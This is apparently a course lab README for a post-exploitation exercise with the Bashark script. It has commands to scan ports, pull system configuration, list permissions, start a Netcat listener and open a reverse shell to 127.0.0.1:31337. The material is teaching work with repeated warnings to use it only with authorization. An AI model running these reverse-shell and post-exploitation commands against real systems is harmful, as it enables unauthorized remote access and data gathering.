# Activity 8.2 - Post-Exploitation Assessment with Bashark

## Overview

This activity explores selected Bashark functions in the supplied Linux training environment. The exercise demonstrates system identification, local network assessment, configuration inspection, and a reverse-shell connection restricted to loopback.

## Objectives

- Load the Bashark script.
- Identify the virtualized environment.
- Explore the available assessment commands.
- Demonstrate a local Netcat listener and reverse connection.
- Execute basic commands through the established lab connection.

## Environment

| Component | Description |
|---|---|
| Virtual Machine | `forenseLinux` |
| Tool | Bashark 2.0 |
| Working Directory | `/opt/bashark` |
| Connection Utility | Netcat / Ncat |
| Listener Address | `127.0.0.1` |
| Listener Port | `31337` |

## Procedure

### 1. Load Bashark

Open a terminal and load the provided script:

```bash
cd /opt/bashark
source bashark.sh
```

### 2. Inspect the Environment

Use the `isvm` function to identify whether the environment is virtualized:

```bash
isvm
```

### 3. Explore the Lab Functions

Run the local port scan against the loopback interface:

```bash
portscan 127.0.0.1
```

Inspect the configuration retrieval function:

```bash
getconf
```

Display the available usage options for `getperm`:

```bash
getperm -h
```

These commands are documented as training exercises and must only be used in an explicitly authorized lab environment.

### 4. Start the Local Netcat Listener

Open another terminal tab and start a listener on port `31337`:

```bash
cd ~
nc -lvnp 31337
```

The listener waits for a connection on the local machine.

### 5. Establish the Loopback Demonstration

Return to the Bashark terminal and run the supplied loopback demonstration:

```bash
revshell 127.0.0.1 31337
```

The use of `127.0.0.1` keeps this exercise within the local machine.

### 6. Verify the Connection

Return to the terminal running Netcat. After the connection is established, execute:

```bash
pwd
ls
```

The output should display the current working directory and its contents.

### 7. Close the Lab Session

Terminate the local shell with:

```bash
exit
```

or press `Ctrl + D`.

Then close the Bashark session in the other terminal.

## Expected Result

The Netcat listener receives the loopback connection initiated by the Bashark demonstration. The `pwd` and `ls` commands display the current working directory and its contents.

## Evidence

**Required screenshot: Step 8 - Print 2, PDF page 2.**

The screenshot must display:

- The personalized terminal prompt.
- The Netcat listener and successful connection from `127.0.0.1`.
- The output of `pwd`.
- The output of `ls`.

- [View consolidated evidence](../evidences.pdf)

## Technical Notes

- Bashark is used here as supplied by the training environment.
- The activity is limited to the local authorized lab.
- The documented reverse-shell connection uses loopback address `127.0.0.1` and port `31337`.
- Do not use these post-exploitation techniques against systems or networks without explicit authorization.
- Configuration files may contain sensitive information. Do not publish extracted system configuration data.

## References

- [Ncat - Network Communication Tool](https://nmap.org/ncat/)

## Navigation

- [Class 08](../README.md)
- [Previous Activity - 8.1](../atividade-8.1-investigacao-rede-p0f/README.md)
- [Next Activity - 8.3](../atividade-8.3-analise-malware-pdf/README.md)
